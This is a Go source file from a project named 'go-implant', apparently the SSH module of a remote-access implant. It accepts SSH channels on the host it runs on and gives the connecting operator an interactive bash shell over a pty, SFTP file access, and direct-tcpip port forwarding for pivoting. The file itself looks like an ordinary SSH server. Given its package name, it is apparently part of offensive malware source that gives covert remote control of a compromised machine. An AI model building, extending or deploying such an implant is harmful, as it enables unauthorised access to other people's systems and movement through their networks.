// +build !windows

package ssh

import (
	"go-implant/client/config"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"os/exec"
	"sync"
	"syscall"
	"unsafe"

	"github.com/kr/pty"
	"golang.org/x/crypto/ssh"
)

func handleChannel(newChannel ssh.NewChannel) {

	isPortForward := false              // variable that tells whether this is a port forward or not
	reqData := DirectTcpipOpenRequest{} // struct to hold portforward arguments

	// Since we're handling a shell, we expect a
	// channel type of "session". The also describes
	// "x11", "direct-tcpip" and "forwarded-tcpip"
	// channel types.
	t := newChannel.ChannelType()
	if t == "direct-tcpip" {

		isPortForward = true

		// get extra data
		err := ssh.Unmarshal(newChannel.ExtraData(), &reqData)
		if err != nil {
			if config.DEBUG {
				log.Print("Got faulty extradata")
			}
			return
		}

	} else if t != "session" {
		newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t))
		return
	}

	// At this point, we have the opportunity to reject the client's
	// request for another logical connection
	connection, requests, err := newChannel.Accept()
	if err != nil {
		if config.DEBUG {
			log.Printf("Could not accept channel (%s)", err)
		}
		return
	}

	// Sessions have out-of-band requests such as "shell", "pty-req" and "env"
	c := make(chan *ssh.Request, 2) // create channel to pass messages regarding session to

	go func() {
		for req := range requests {
			switch req.Type {
			case "shell":
				// We only accept the default shell
				// (i.e. no command in the Payload)
				if len(req.Payload) == 0 {
					req.Reply(true, nil)
				}

				go func() {
					defer connection.Close()
					serveTerminal(connection, c) // serve shell session
				}()

			case "subsystem":
				ok := false
				if string(req.Payload[4:]) == "sftp" {
					ok = true
				}
				req.Reply(ok, nil)

				go func() {
					defer connection.Close()
					defer connection.CloseWrite()
					handlesftp(connection) // serve sftp session
				}()

			// pty related messages, pass them along to the
			case "pty-req":
				c <- req // we have not created the pty yet, pass along

			case "window-change":
				c <- req // we have not created the pty yet, pass along
			}
		}
	}()

	// if this is portforward, serve portforward
	if isPortForward {
		ServePortForward(connection, reqData.HostToConnect, int(reqData.PortToConnect))
	}
}

// serve terminal to the client
func serveTerminal(connection ssh.Channel, oldrequests <-chan *ssh.Request) {

	// Fire up bash for this session
	bash := exec.Command("bash")

	// Prepare teardown function
	close := func() {
		_, err := bash.Process.Wait()
		if err != nil {
			if config.DEBUG {
				log.Printf("Failed to exit bash (%s)", err)
			}
		}
		if config.DEBUG {
			log.Printf("Session closed")
		}
	}

	// Allocate a terminal for this channel
	if config.DEBUG {
		log.Print("Creating pty...")
	}
	bashf, err := pty.Start(bash)
	if err != nil {
		if config.DEBUG {
			log.Printf("Could not start pty (%s)", err)
		}
		close()
		return
	}

	//pipe session to bash and visa-versa
	var once sync.Once
	go func() {
		io.Copy(connection, bashf)
		once.Do(close)
	}()
	go func() {
		io.Copy(bashf, connection)
		once.Do(close)
	}()

	// reply to old out-of-band requests regarding shell
	go func() {
		for req := range oldrequests {
			switch req.Type {
			case "pty-req":
				termLen := req.Payload[3]
				w, h := parseDims(req.Payload[termLen+4:])
				SetWinsize(bashf.Fd(), w, h)
				// Responding true (OK) here will let the client
				// know we have a pty ready for input
				req.Reply(true, nil)
			case "window-change":
				w, h := parseDims(req.Payload)
				SetWinsize(bashf.Fd(), w, h)
			}
		}
	}()

	// wait until bash finishes
	bash.Process.Wait()
}

// SetWinsize sets the size of the given pty.
func SetWinsize(fd uintptr, w, h uint32) {
	ws := &Winsize{Width: uint16(w), Height: uint16(h)}
	syscall.Syscall(syscall.SYS_IOCTL, fd, uintptr(syscall.TIOCSWINSZ), uintptr(unsafe.Pointer(ws)))
}

// parseDims extracts terminal dimensions (width x height) from the provided buffer.
func parseDims(b []byte) (uint32, uint32) {
	w := binary.BigEndian.Uint32(b)
	h := binary.BigEndian.Uint32(b[4:])
	return w, h
}

// ======================

// Winsize stores the Height and Width of a terminal.
type Winsize struct {
	Height uint16
	Width  uint16
	x      uint16 // unused
	y      uint16 // unused
}
